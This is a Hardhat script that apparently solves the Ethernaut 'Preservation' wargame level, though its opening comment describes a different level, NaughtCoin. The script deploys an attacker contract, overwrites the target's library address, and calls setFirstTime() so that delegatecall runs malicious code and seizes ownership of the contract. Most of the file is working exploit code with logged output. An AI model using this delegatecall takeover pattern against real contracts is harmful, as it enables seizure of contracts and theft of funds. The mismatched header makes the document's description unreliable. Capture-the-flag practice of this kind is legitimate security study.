/*
NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

  Things that might help

The ERC20 Spec            (https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) 
The OpenZeppelin codebase (https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts)
*/

const hre = require("hardhat");

async function main() {
  // Recreating the attack on ganache
  [player] = await ethers.getSigners();

  // Get an instance of the contract deployed by Ethernaut
  const PreservationAddress = "0xBEe316f7C801408644C3E9e5a4DB8b957BcE8280"
  this.preservation = await hre.ethers.getContractAt("Preservation",PreservationAddress);

  const PreservationAttack = await hre.ethers.getContractFactory("PreservationAttack");
  this.preservationAttack = await PreservationAttack.connect(player).deploy(this.preservation.address);
  await this.preservationAttack.deployed();

  console.log(
    `
    Preservation contract address ${await this.preservation.address} \n
    PreservationAttack contract address ${await this.preservationAttack.address} \n
    timeZone1Library ${await this.preservation.timeZone1Library()} \n
    timeZone2Library ${await this.preservation.timeZone2Library()} \n
    owner ${await this.preservation.owner()}
    `
  );

  console.log("\n\n Performing attack ... \n\n");

  // Updating the address of the timeZone1Library variable
  console.log("Updating the address of the timeZone1Library variable ...");

  const changeLibraryAddressTX = await this.preservationAttack.connect(player).changeLibraryAddress();
  
  // Await for the changeLibraryAddressTX to be mined
  console.log("Waiting while the address of the timeZone1Library variable is updated : )");
  let changeLibraryAddressTXResult = await changeLibraryAddressTX.wait();

  //console.log("transaction " , changeLibraryAddressTXResult);

  console.log("===============================================\n===============================================\n");
  console.log("\n Results after updating the timeZone1Library address for the Attacker contract address \n");

  console.log(
    `
    PreservationAttack contract address ${await this.preservationAttack.address} \n
    timeZone1Library ${await this.preservation.timeZone1Library()}
    `
  );

  // Completing the Attack
  // Now that timeZone1Library is pointing to the attacker contract, is a matter to call the malitious setTime() of the Attacker contract to update the owner of the Preservation contract!
  console.log("\n Completing the attack --- Taking ownership of the Preservation contract \n\n");

  // setFirstTime() of the Preservation contract will use the address stored in the timeZone1Library variable (Which is the address of the malitious contract)
  // At the end, the function that will be executed is the setFirstTime() of the malicious contract!
  const takeOwnershipTX = await this.preservation.connect(player).setFirstTime(1,{ gasLimit: 3000000 }); // Forcing to send 3million as gasLimit
  
  // Await for the takeOwnershipTX to be mined
  console.log("Waiting while we take ownership of the Preservation contract : )");
  let takeOwnershipTXResult = await takeOwnershipTX.wait();

  console.log("takeOwnershipTXResult " , takeOwnershipTXResult);

  console.log(
    `
    Preservation contract address ${await this.preservation.address} \n
    PreservationAttack contract address ${await this.preservationAttack.address} \n
    timeZone1Library ${await this.preservation.timeZone1Library()} \n
    timeZone2Library ${await this.preservation.timeZone2Library()} \n
    player address: ${await player.address} \n
    Preservation contract's owner ${await this.preservation.owner()}
    `
  );
  
  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});